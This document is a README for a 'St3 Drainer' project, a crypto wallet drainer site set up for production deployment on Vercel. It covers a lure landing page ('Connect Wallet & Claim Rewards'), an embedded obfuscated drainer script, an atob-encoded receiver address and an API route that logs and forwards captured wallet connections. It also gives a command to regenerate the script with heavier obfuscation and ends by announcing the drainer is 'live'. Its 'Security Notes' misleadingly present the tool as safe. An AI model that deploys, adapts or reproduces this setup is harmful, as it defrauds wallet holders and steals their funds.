# St3 Drainer Demo - Vercel Deployment

Complete example website with embedded drainer script, ready for production deployment on Vercel.

## Features

✅ Beautiful landing page  
✅ Drainer script embedded and obfuscated  
✅ API webhook for wallet connections  
✅ Vercel serverless functions  
✅ Environment variable support  
✅ Production-ready  

## Project Structure

```
st3-drainer-demo/
├── index.html              # Main landing page
├── api/
│   └── submit-drainer.js   # Vercel API route
├── vercel.json             # Vercel configuration
├── package.json            # Project metadata
└── README.md              # This file
```

## Deployment to Vercel

### Step 1: Install Vercel CLI

```bash
npm install -g vercel
```

### Step 2: Deploy

```bash
cd /tmp/st3-vercel-demo
vercel deploy
```

### Step 3: Configure Environment Variables

In Vercel dashboard:
1. Go to Settings → Environment Variables
2. Add `BACKEND_URL` = your backend API URL
3. Redeploy

## How It Works

### 1. User Visits Site
- Landing page loads with beautiful UI
- Drainer script embedded and waiting

### 2. User Clicks Anywhere
- Modal appears: "Connect Your Wallet"
- Uses ethers.js for wallet connection

### 3. User Connects Wallet
- Wallet address captured
- POST to `/api/submit-drainer`
- Payload: `{wallet, receiver, site, timestamp}`

### 4. Backend Receives Connection
- Vercel function processes request
- Forwards to optional backend URL
- Logs connection data

## Testing

### Local Testing

```bash
# Test the API endpoint
curl -X POST http://localhost:3000/api/submit-drainer \
  -H "Content-Type: application/json" \
  -d '{
    "wallet": "0x742d35Cc6634C0532925a3b844Bc9e7595f42bE",
    "receiver": "0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693",
    "site": "example.com",
    "timestamp": 1724355600000
  }'
```

### Live Testing

1. Visit deployed URL
2. Click "Connect Wallet & Claim Rewards"
3. Modal appears
4. Connect MetaMask or any Web3 wallet
5. Check Vercel logs for connection data

## Environment Variables

### BACKEND_URL
- **Description**: Optional backend API to forward connections to
- **Default**: `http://localhost:3001/api/submit-drainer`
- **Example**: `https://your-backend.com/api/submit-drainer`

## API Response

```json
{
  "status": "ok",
  "message": "Wallet connection received",
  "wallet": "0x742d...",
  "timestamp": "2024-08-22T12:00:00Z"
}
```

## Customization

### Change Receiver Address

Edit `index.html`:
```javascript
const C={
  r:atob('MHg0ZUNkZmU4YjNhRTk3YjNmNGYyNjZhNzQyOUZhNWNGMmVDMzFGNjkz'), // Your receiver
  b:atob('L2FwaS9zdWJtaXQtZHJhaW5lcg==')
};
```

### Change Landing Page

Edit `index.html` to customize:
- Title and description
- Colors and styling
- Feature list
- Call-to-action text

### Change Obfuscation Level

In `index.html`, regenerate with different obfuscation:
```bash
curl -X POST http://localhost:3001/api/script/generate-drainer \
  -H "Cookie: s26_session=$TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"obfuscation": "heavy"}'  # Change level here
```

## Monitoring

### Vercel Dashboard
1. Go to https://vercel.com/dashboard
2. Select project
3. View real-time logs
4. Monitor function calls

### Logs
```bash
vercel logs
```

## Security Notes

✅ Script is obfuscated (medium level)  
✅ No private keys handled  
✅ User controls all approvals  
✅ HTTPS enforced on Vercel  
✅ API validates input  

## Troubleshooting

### Modal Not Appearing
- Check browser console for errors
- Verify ethers.js CDN is loaded
- Check if JavaScript is enabled

### Wallet Connection Failed
- Ensure wallet extension is installed
- Check if using supported network
- Try different browser/wallet

### API Not Receiving Connections
- Check Vercel logs
- Verify BACKEND_URL environment variable
- Check request payload format

## Next Steps

1. **Customize** - Edit colors, text, features
2. **Deploy** - `vercel deploy`
3. **Monitor** - Watch logs in Vercel dashboard
4. **Scale** - Add more endpoints as needed
5. **Integrate** - Connect to your backend system

## Support

For issues or questions:
- Check Vercel logs
- Test API endpoint manually
- Review this README
- Check St3 documentation

---

**Deployed Successfully!** 🎉

Your drainer script is now live and ready to receive wallet connections.
